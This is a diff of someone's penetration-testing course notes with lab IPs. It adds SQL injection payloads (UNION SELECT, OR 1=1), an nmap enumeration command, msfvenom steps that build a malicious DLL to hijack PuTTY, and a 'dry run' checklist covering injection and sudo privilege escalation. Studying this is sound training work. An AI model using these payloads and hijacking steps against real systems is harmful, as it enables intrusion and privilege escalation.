@@ -244,6 +244,10 @@ ile upload
 * Audi' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo # 
 * Audi' UNION SELECT tireid,2,size,cost,5 FROM session_schema.columns
 
+* run after finding port 80 to enumerate possible directoriesnmap 10.50.42.226 --script=http-enum.nse
+  IF LIST Selection=2 OR 1=1
+  IF NOT LIST, find unsanitized boxes, directory traversal, and/or GET method
+
 
 
 # SQL Injection on a unsanitized website
@@ -267,6 +271,7 @@ Steps:
 * UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 * UNION SELECT session_id,user_id,statusFROM session.session_log # 
 * UNION SELECT id,name,@@version FROM session.user 
+
 
 
 
@@ -558,6 +563,10 @@ s.close()
 * In TErminator run -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt'-f dll > SSPICLI 
 * From powershell run -> scp student@10.50.37.248:/home/student/SSPICLI.dll "C:\Program Files (X86)\Putty\SSPICLI.dll"
 * CD to C:\ and CD into file location 
+* C:\Users\Student\Desktop.\SysinternalsSuite\strings.exe C:\Users\Student\Desktop\essfunc.dll
+* C:\Users\Student\Desktop.\SysinternalsSuite\strings.exe C:\Users\Student\Desktop\secureserverind.exe
+* scp func  student@10.50.37.248:/home/student -> scp command transfering from host to remote
+
 
 * rename og putty file 
 * msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe  > putty.exe
@@ -638,6 +647,32 @@ touch -r 3.txt 1.txt # Reference
 * EX: *.*  @192.168.10.254:514 
       *.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")
 * RFC 5424 -> RFC for syslog 
+
+
+
+```
+
+# Dry Run Notes 
+```
+* head to website through firefox 
+* verify options -> EX: Product=7 
+* run or in url 
+* Product=7 OR 1=1 
+* Verify Columns EX: Product = 7 UNION SELECT 1,2,3
+* inject golden rule EX: UNION SELECT table_schema,column_name, table_name FROM infoemation_schema.column
+* Modify Golden Statment to match table 
+* Onve fnished ind the next machine and enumerate 
+* sudo -l displays find command can be sudo'ed 
+* GTFO bins tofind vulnerabilities using sudo 
+* enumerate neighboring ip's
+
+
+
+
+
+
+
+
 
 
 
